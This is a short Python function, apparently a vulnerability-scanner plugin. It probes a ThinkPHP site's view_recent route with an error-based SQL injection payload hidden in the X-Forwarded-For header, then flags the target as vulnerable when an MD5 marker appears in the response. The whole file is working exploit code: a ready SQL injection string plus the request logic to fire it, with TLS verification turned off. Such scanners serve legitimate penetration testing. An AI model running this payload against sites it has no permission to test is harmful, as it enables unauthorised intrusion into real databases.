import urllib
import requests


def thinkphp_view_recent_xff_sqli(url):
    relsult = {
        'name': 'thinkphp_view_recent_xff_sqli',
        'vulnerable': False
    }
    headers = {
        "User-Agent" : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
        "X-Forwarded-For" : "1')And/**/ExtractValue(1,ConCat(0x5c,(sElEct/**/Md5(2333))))#"
    }
    try:
        vurl = urllib.parse.urljoin(url, 'index.php?s=/home/article/view_recent/name/1')
        req = requests.get(vurl, headers=headers, timeout=15, verify=False)
        if r"56540676a129760a" in req.text:
            relsult['vulnerable'] = True
            relsult['method'] = 'GET'
            relsult['url'] = vurl
            relsult['parameter'] = 'X-Forwarded-For'
            relsult['payload'] = headers['X-Forwarded-For']
        return relsult
    except:
        return relsult